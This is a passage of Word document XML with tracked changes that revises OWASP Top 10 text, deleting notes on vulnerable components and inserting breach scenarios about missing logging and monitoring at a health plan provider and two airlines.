          </w:rPr>
          <w:delText>* Monitor for libraries and components that are unmaintained or do not create security patches for older versions. If patching is not possible, consider deploying a virtual patch to monitor, detect, or protect against the discovered issue.</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="6D733ADB" w14:textId="77777777" w:rsidR="00E13797" w:rsidRPr="00E13797" w:rsidRDefault="00E13797" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="3333" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="3334" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>Every organization must ensure that there is an ongoing plan for monitoring, triaging, and applying updates or configuration changes for the lifetime of the application or portfolio.</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="48805417" w14:textId="78A5DFF0" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7E26C939" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>## Example Attack Scenarios</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E8CE81C" w14:textId="77777777" w:rsidR="00E13797" w:rsidRPr="00E13797" w:rsidRDefault="00E13797" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="3335" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="3336" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>**Scenario #1**: Components typically run with the same privileges as the application itself, so flaws in any component can result in serious impact. Such flaws can be accidental (e.g. coding error) or intentional (e.g. backdoor in component). Some example exploitable component vulnerabilities discovered are:</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="4EB13FA1" w14:textId="77777777" w:rsidR="00E13797" w:rsidRPr="00E13797" w:rsidRDefault="00E13797" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="3337" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="3338" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>* [CVE-2017-5638](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5638), a Struts 2 remote code execution vulnerability that enables execution of arbitrary code on the server, has been blamed for significant breaches.</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="00E2EBF1" w14:textId="77777777" w:rsidR="00E13797" w:rsidRPr="00E13797" w:rsidRDefault="00E13797" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="3339" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="3340" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>* While [internet of things (IoT)](https://en.wikipedia.org/wiki/Internet_of_things) are frequently difficult or impossible to patch, the importance of patching them can be great (e.g. biomedical devices).</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="1C8237F9" w14:textId="77777777" w:rsidR="00E13797" w:rsidRPr="00E13797" w:rsidRDefault="00E13797" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="3341" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="3342" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>There are automated tools to help attackers find unpatched or misconfigured systems. For example, the [Shodan IoT search engine](https://www.shodan.io/report/89bnfUyJ) can help you find devices that still suffer from [Heartbleed](https://en.wikipedia.org/wiki/Heartbleed) vulnerability that was patched in April 2014.</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="4AAA0082" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:moveFrom w:id="3343" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:moveFromRangeStart w:id="3344" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z" w:name="move137923176"/>
    </w:p>
    <w:p w14:paraId="76E25147" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:moveFrom w:id="3345" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:moveFrom w:id="3346" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>## References</w:t>
        </w:r>
      </w:moveFrom>
    </w:p>
    <w:moveFromRangeEnd w:id="3344"/>
    <w:p w14:paraId="31028BDD" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3347" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="49BC7660" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3348" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3349" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>**Scenario #</w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>1:*</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>* A children's health plan provider's website operator</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="5E161997" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3350" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3351" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>couldn't detect a breach due to a lack of monitoring and logging. An</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="10E09218" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3352" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3353" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>external party informed the health plan provider that an attacker had</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="12516D33" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3354" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3355" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>accessed and modified thousands of sensitive health records of more than</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="58D70622" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3356" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3357" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>3.5 million children. A post-incident review found that the website</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="4C132091" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3358" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3359" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>developers had not addressed significant vulnerabilities. As there was</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="14D528D4" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3360" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3361" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>no logging or monitoring of the system, the data breach could have been</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="508C11CD" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3362" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3363" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>in progress since 2013, a period of more than seven years.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="2893B593" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3364" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="45A9828C" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3365" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3366" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>**Scenario #</w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>2:*</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>* A major Indian airline had a data breach involving more</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="13020CE7" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3367" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3368" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>than ten years' worth of personal data of millions of passengers,</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="50B5BDCD" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3369" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3370" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>including passport and credit card data. The data breach occurred at a</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="673F510A" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3371" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3372" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>third-party cloud hosting provider, who notified the airline of the</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="0314D83C" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3373" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3374" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>breach after some time.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="51B822FA" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00AC649A" w:rsidRDefault="00841D1E" w:rsidP="00AC649A">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:moveTo w:id="3375" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:moveToRangeStart w:id="3376" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z" w:name="move137923174"/>
    </w:p>
    <w:p w14:paraId="6355156A" w14:textId="77777777" w:rsidR="00E13797" w:rsidRPr="00E13797" w:rsidRDefault="00841D1E" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="3377" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:moveTo w:id="3378" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00AC649A">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>**Scenario #3</w:t>
        </w:r>
      </w:moveTo>
      <w:moveToRangeEnd w:id="3376"/>
      <w:del w:id="3379" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00E13797" w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>### OWASP</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="2022BEF8" w14:textId="522370D4" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00E13797" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3380" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="3381" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>*</w:delText>
        </w:r>
      </w:del>
      <w:proofErr w:type="gramStart"/>
      <w:ins w:id="3382" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>:*</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>* A major European airline suffered a GDPR reportable</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="7004FB05" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3383" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3384" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>breach. The breach was reportedly caused by payment application security</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="0A1EE13C" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3385" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3386" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>vulnerabilities exploited by attackers, who harvested more than 400,000</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="5DB37C5C" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3387" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3388" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>customer payment records. The airline was fined 20 million pounds as a</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="49B6ACCA" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3389" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3390" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>result by the privacy regulator.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="000F9349" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3391" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7091F916" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3392" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3393" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">## References </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="2B0DA938" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3394" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
